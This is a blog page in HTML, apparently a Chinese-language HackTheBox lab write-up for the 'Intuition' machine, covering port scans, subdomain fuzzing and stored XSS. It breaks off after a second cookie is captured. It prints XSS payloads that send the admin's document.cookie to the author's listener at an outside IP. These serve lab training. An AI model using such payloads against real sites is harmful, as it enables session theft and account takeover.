@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P IntuitionDon’t share the HASH if machine is active !!! 居然有三次提權，而且還有兩次是非預期 QAQ 0x1 Nm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Intuition">
+<meta property="og:url" content="https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P IntuitionDon’t share the HASH if machine is active !!! 居然有三次提權，而且還有兩次是非預期 QAQ 0x1 Nm">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428030615-1bxjp60.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429033327-5ddzcsq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429034643-f3lhv6c.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428033509-ts9up5w.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428033825-e5b3unf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428034033-2r8rqys.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428034455-e6fe25x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429040235-o1z0cb9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429040831-ai0troc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429041523-si78ebf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429041625-coal2x1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429042033-kor105v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428035545-vx9xzua.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428035530-dh52ksh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429043358-xz846pc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429161359-3i0hfxb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428050015-7wetx7f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428050028-mcjlkt9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051422-aubg7z3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051527-5o2oqve.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051614-7ku99xz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051406-j3bu6t6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051736-lstd7xb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051809-tq1p5n4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051918-15e2j9z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051947-wxcusza.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429050734-w0v0j40.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062632-4s482ui.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062645-qn42car.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062653-ove9ndf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428065604-qte4glq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429145535-7ba2tsc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429155902-tqcen9v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429160117-jhncz34.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429160210-uzb9ntx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429000813-rsuw2t9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429170513-a9470re.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429170829-yrmluf7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428203504-oiwhwnw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428203536-m1vq0qf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171022-qcf9vgk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428204845-88zyrvr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212309-s3hp0rb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428210523-hdcyjji.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212448-u0a0b2b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428212512-9lf0m36.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171645-yb17fon.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429171942-aiymqkr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428224946-amcjj5k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429172345-fhsra9m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173317-vcrmt17.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173441-sdwo631.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429173539-2xtu19d.png">
+<meta property="article:published_time" content="2024-04-29T09:43:11.000Z">
+<meta property="article:modified_time" content="2024-09-15T20:58:47.198Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428030615-1bxjp60.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Intuition</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&text=HackTheBox - Machine - Intuition"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&is_video=false&description=HackTheBox - Machine - Intuition"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Intuition&body=Check out this article: https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&title=HackTheBox - Machine - Intuition"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&name=HackTheBox - Machine - Intuition&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/29/2024-htb-machine/17-Intuition/&t=HackTheBox - Machine - Intuition"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Intuition
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-29T09:43:11.000Z" class="dt-published" itemprop="datePublished">2024-04-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Intuition"><a href="#Intuition" class="headerlink" title="Intuition"></a>Intuition</h1><p>Don’t share the HASH if machine is active !!!</p>
+<p>居然有三次提權，而且還有兩次是非預期 QAQ</p>
+<h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=</span><br><span class="line">|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:<span class="built_in">cd</span> (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://comprezzor.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>經典的80端口，UDP 什麽也沒有好看的。</p>
+<h2 id="0x2-80-XSS-to-admin-cookie"><a href="#0x2-80-XSS-to-admin-cookie" class="headerlink" title="0x2 80 - XSS to admin cookie"></a>0x2 80 - XSS to admin cookie</h2><p>輸入ip后，瀏覽器自動跳轉到 <code>http://comprezzor.htb/</code>​，這個時候會隨手 fuzz 一下子域名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://10.129.201.50&quot;</span>  -H <span class="string">&quot;Host: FUZZ.comprezzor.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178</span><br><span class="line"></span><br><span class="line">[Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 128ms]</span><br><span class="line">    * FUZZ: auth</span><br><span class="line"></span><br><span class="line">[Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 156ms]</span><br><span class="line">    * FUZZ: dashboard</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 129ms]</span><br><span class="line">    * FUZZ: report</span><br></pre></td></tr></table></figure>
+
+<p>把這些都加入到 hosts 文件裏面，來到：<code>http://comprezzor.htb/</code>​，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428030615-1bxjp60.png" alt="image">​</p>
+<p>隨手上傳一些文件，下來就是一個壓縮包，什麽也沒有，不過看到下面有一個report，點進去看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429033327-5ddzcsq.png" alt="image">​</p>
+<p>點進去之後要注冊，隨手注冊一個賬號，并且登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429034643-f3lhv6c.png" alt="image">​</p>
+<p>這裏的提示是 <code>Bug report submitted successfully! Our team will be checking on this shortly.</code>​ ，也就是管理員會看到這個頁面，所以這個時候想的是XSS，於是隨便為找一個payload試一下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;http://10.10.16.21/mane.js&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>結果還真的可以得到xss，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428033509-ts9up5w.png" alt="image">​</p>
+<p>然後讓他跳轉到外部的鏈接，這樣你就可以得到cookie：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&#x27;http://10.10.16.21/?title=&#x27;</span>+<span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到了一個用戶的cookie，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428033825-e5b3unf.png" alt="image">​</p>
+<p><strong>注意</strong>：如果還是得不到的話建議重設機器。</p>
+<p>得到cookie拿來base64解密一下，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA==&#x27;</span> | <span class="built_in">base64</span> -d </span><br><span class="line">user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4</span><br></pre></td></tr></table></figure>
+
+<p>填到瀏覽器你就可以進入這個頁面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428034033-2r8rqys.png" alt="image">​</p>
+<p>如果這個時候再base64一下，可以看到這個cookie的當前用戶是adam。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428034455-e6fe25x.png" alt="image">​</p>
+<p>隨便點擊一個報告，會有三個按鈕，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429040235-o1z0cb9.png" alt="image">​</p>
+<p>點擊 <code>Resolved</code>​ 和 <code>Delete Report</code>​ 之後什麽也沒有發生。但是點擊 <code>Set Low Priority</code>​ 會讓 <code>Priority</code>​ 變成1。</p>
+<p>枚舉了一段時間之後什麽也沒有，然後就會猜測如果是<code>Priority</code>​ 變成1的時候，會不會有管理員瀏覽這個網頁，然後從中得到cookie，所以填多一次XSS，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429040831-ai0troc.png" alt="image">​</p>
+<p>點擊提交之後可以看到，這裏的ID 21是你剛剛提交的XSS内容，如果你點擊，則會觸發XSS，使你沒辦法設置 <code>Priority</code>​ 變成1。</p>
+<p>這時候會思考可以使用api來修改<code>Priority</code>​不，點擊其他的ID，然後用burp來截取設置 <code>Priority</code>​的api，來讓自己的payload的<code>Priority</code>​ 變高，這樣就有機會偷盜管理員的cookie：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429041523-si78ebf.png" alt="image">​</p>
+<p>經過多次嘗試后：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429041625-coal2x1.png" alt="image">​</p>
+<p>得到了另一個cookie：</p>
